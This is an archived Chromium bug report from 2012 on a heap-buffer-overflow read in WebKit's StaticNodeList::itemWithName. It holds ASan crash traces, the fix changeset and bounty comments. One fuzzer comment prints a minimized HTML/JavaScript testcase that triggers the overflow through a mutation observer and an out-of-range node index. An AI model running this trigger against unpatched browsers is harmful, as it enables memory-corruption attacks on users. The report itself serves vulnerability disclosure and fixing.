# Heap-buffer-overflow in WebCore::StaticNodeList::itemWithName

| Field | Value |
|-------|-------|
| **Issue ID** | [40054119](https://issues.chromium.org/issues/40054119) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ao...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-24 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

ASan reports a heap buffer overflow when the attached page is opened. The page accesses WebKit mutation observer inputs at an interesting offset.

**VERSION**  

Chrome Version: 19.0.1050.0 (Developer Build 123195)  

Operating System: Linux (Debian 6.0.4, x86\_64)

**REPRODUCTION CASE**  

$ chrome-asan muta.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab (just bof)  

Crash State:

==26291== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f5f15eddee0 at pc 0x3d6dd59 bp 0x7fffb73d0a60 sp 0x7fffb73d0a58  

READ of size 8 at 0x7f5f15eddee0 thread T0  

#0 0x3d6dd59 in WebCore::StaticNodeList::itemWithName(WTF::AtomicString const&) const ???:0  

#1 0x77e89cf in WebCore::V8NodeList::namedPropertyGetter(v8::Local[v8::String](javascript:void(0);), v8::AccessorInfo const&) ???:0  

#2 0x2daf67b in v8::internal::JSObject::GetPropertyWithInterceptor(v8::internal::JSReceiver\*, v8::internal::String\*, PropertyAttributes\*) ???:0  

#3 0x2da42f3 in v8::internal::Object::GetPropertyWithReceiver(v8::internal::Object\*, v8::internal::String\*, PropertyAttributes\*) ???:0  

#4 0x2f00147 in v8::internal::Runtime::GetObjectProperty(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);)) ???:0  

#5 0x31d400a in v8::internal::KeyedLoadIC::Load(v8::internal::InlineCacheState, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), bool) ???:0  

#6 0x31df7d9 in v8::internal::KeyedLoadIC\_Miss(v8::internal::Arguments, v8::internal::Isolate\*) ???:0  

#7 0x95163b0424e in ?? ??:0  

#8 0x95163b3241f in ?? ??:0  

#9 0x95163b20747 in ?? ??:0  

#10 0x95163b0f237 in ?? ??:0  

#11 0x2b080f8 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) v8/src/execution.cc:0  

#12 0x2a70932 in v8::Function::Call(v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) ???:0  

#13 0x43dd5f3 in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Frame\*, v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) ???:0  

#14 0x77c2c35 in WebCore::invokeCallback(v8::Persistent[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*, bool&, WebCore::ScriptExecutionContext\*) ???:0  

#15 0x77e7f90 in WebCore::V8MutationCallback::handleEvent(WTF::Vector<WTF::RefPtr[WebCore::MutationRecord](javascript:void(0);), 0ul>\*, WebCore::WebKitMutationObserver\*) ???:0  

#16 0x3d7e447 in WebCore::WebKitMutationObserver::deliver() ???:0  

#17 0x3d7ea10 in WebCore::WebKitMutationObserver::deliverAllMutations() ???:0  

#18 0x43dcc2b in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) ???:0  

#19 0x43dbdf5 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) ???:0  

#20 0x438eea6 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) ???:0  

#21 0x3dc59fc in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) ???:0  

#22 0x3dc19c3 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) ???:0  

#23 0x3f87154 in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) ???:0  

#24 0x3f86be1 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) ???:0  

#25 0x3f7b18d in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() ???:0  

#26 0x3f7b500 in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) ???:0  

#27 0x3f7a786 in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) ???:0  

#28 0x3f7c2a4 in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) ???:0  

#29 0x76e1e4c in WebCore::DecodedDataDocumentParser::flush(WebCore::DocumentWriter\*) ???:0  

#30 0x490d9e9 in WebCore::DocumentWriter::endIfNotLoadingMainResource() ???:0  

#31 0x4944779 in WebCore::FrameLoader::finishedLoading() ???:0  

#32 0x496b3c1 in WebCore::MainResourceLoader::didFinishLoading(double) ???:0  

#33 0x606f922 in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) ???:0  

#34 0x359a28a in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) ???:0  

#35 0x359b47b in bool ResourceMsg\_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)) ???:0  

#36 0x3597a4c in ResourceDispatcher::DispatchMessage(IPC::Message const&) ???:0  

#37 0x35959d0 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) ???:0  

#38 0x349a94f in ChildThread::OnMessageReceived(IPC::Message const&) ???:0  

#39 0x3628a83 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ???:0  

#40 0x1dc8326 in MessageLoop::RunTask(base::PendingTask const&) ???:0  

#41 0x1dc8b86 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) ???:0  

#42 0x1dc9e6b in MessageLoop::DoWork() ???:0  

#43 0x1dd41c7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ???:0  

#44 0x1dc6f1e in MessageLoop::RunInternal() ???:0  

#45 0x1dc510f in MessageLoop::Run() ???:0  

#46 0x6c06be2 in RendererMain(content::MainFunctionParams const&) ???:0  

#47 0x1d229b6 in (anonymous namespace)::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:0  

#48 0x1d2105a in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) ???:0  

#49 0x567a87 in ChromeMain ??:0  

#50 0x5679db in main ???:0  

#51 0x7f5f1a983c8d in ?? ??:0  

0x7f5f15eddee0 is located 16 bytes to the right of 80-byte region [0x7f5f15edde80,0x7f5f15edded0)  

allocated by thread T0 here:  

#0 0x7d77b32 in operator new(unsigned long) ??:0  

#1 0x3d6ea26 in WebCore::Text::create(WebCore::Document\*, WTF::String const&) ???:0  

#2 0x3c4a12e in WebCore::Document::createTextNode(WTF::String const&) ???:0  

#3 0x574cee0 in WebCore::DocumentInternal::createTextNodeCallback(v8::Arguments const&) out/Release/obj/gen/webkit/bindings/V8DerivedSources16.cpp:0  

#4 0x2abb726 in v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0  

#5 0x95163b0424e in ?? ??:0  

#6 0x95163b32355 in ?? ??:0  

#7 0x95163b20747 in ?? ??:0  

#8 0x95163b0f237 in ?? ??:0  

#9 0x2b080f8 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) v8/src/execution.cc:0  

#10 0x2a568a9 in v8::Script::Run() ???:0  

#11 0x43dcbe3 in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) ???:0  

#12 0x43dbdf5 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) ???:0  

#13 0x438eea6 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) ???:0  

#14 0x3dc59fc in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) ???:0  

#15 0x3dc19c3 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) ???:0  

#16 0x3f87154 in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) ???:0  

#17 0x3f86be1 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) ???:0  

#18 0x3f7b18d in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() ???:0  

#19 0x3f7b500 in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) ???:0  

#20 0x3f7a786 in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) ???:0  

#21 0x3f7c2a4 in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) ???:0  

==26291== ABORTING  

Stats: 3M malloced (5M for red zones) by 16182 calls  

Stats: 0M realloced by 42 calls  

Stats: 2M freed by 7953 calls  

Stats: 0M really freed by 0 calls  

Stats: 48M (12296 full pages) mmaped in 12 calls  

mmaps by size class: 8:16383; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32; 18:16; 19:8;  

mallocs by size class: 8:13647; 9:1193; 10:924; 11:238; 12:46; 13:51; 14:55; 15:8; 16:11; 17:6; 18:2; 19:1;  

frees by size class: 8:6063; 9:810; 10:831; 11:129; 12:23; 13:36; 14:44; 15:5; 16:4; 17:5; 18:2; 19:1;  

rfrees by size class:  

Stats: malloc large: 9 small slow: 77  

Shadow byte and word:  

0x1febe2bdbbdc: fb  

0x1febe2bdbbd8: 00 00 fb fb fb fb fb fb  

More shadow bytes:  

0x1febe2bdbbb8: fb fb fb fb fb fb fb fb  

0x1febe2bdbbc0: fa fa fa fa fa fa fa fa  

0x1febe2bdbbc8: fa fa fa fa fa fa fa fa  

0x1febe2bdbbd0: 00 00 00 00 00 00 00 00  

=>0x1febe2bdbbd8: 00 00 fb fb fb fb fb fb  

0x1febe2bdbbe0: fa fa fa fa fa fa fa fa  

0x1febe2bdbbe8: fa fa fa fa fa fa fa fa  

0x1febe2bdbbf0: 00 00 00 00 00 00 fb fb  

0x1febe2bdbbf8: fb fb fb fb fb fb fb fb

## Attachments

- [muta.html](attachments/muta.html) (text/html; charset=us-ascii, 337 B)

## Timeline

### in...@chromium.org (2012-02-24)

looking.

### in...@chromium.org (2012-02-24)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=79532

### in...@chromium.org (2012-02-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=22532207

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x7f79b14573e0
Crash State:
  - crash stack -
  WebCore::StaticNodeList::itemWithName
  WebCore::V8NodeList::namedPropertyGetter
  v8::internal::JSObject::GetPropertyWithInterceptor
  

Minimized Testcase (0.30 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94J_fiav_ieJsHY4MRU5exRydo6LvmYD3Qdy3nqwIHXA4bbhUiAHuwEl70IATm-j36bmjhlkNkacaeISzLzNE897Ip8ENce3pHR3rnRftM2St3I2k7AUzAXXv9_fbA9khr9adKEnwUebdtAbmxBtg8GEfFfXg
<body>
<script>
function mutationCallback(mutations, observer) {
    alert(mutations[0].addedNodes[4294967296]);
}
var mutationObserver = new WebKitMutationObserver(mutationCallback);
mutationObserver.observe(document.body, {childList: true});
document.body.appendChild(document.createTextNode('foo'));
</script>

### in...@chromium.org (2012-02-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-25)

http://trac.webkit.org/changeset/108878

### sc...@gmail.com (2012-03-08)

Well caught, and very early in the release cycle :)
$1000


### ao...@gmail.com (2012-03-08)

Excellent :) This one goes to Red Cross.

### sc...@gmail.com (2012-03-30)

Reward upped to $1337 and donated

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/115695?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054119)*
